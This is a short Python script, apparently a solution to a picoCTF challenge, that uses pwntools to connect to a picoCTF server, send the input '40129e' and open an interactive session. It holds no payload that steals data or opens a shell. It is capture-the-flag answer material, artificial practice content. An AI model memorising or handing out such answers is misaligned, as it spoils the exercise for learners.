#!/usr/bin/env python
from pwn import *
r = remote("saturn.picoctf.net", 63591)
r.sendline("40129e")

r.interactive()
r.close()
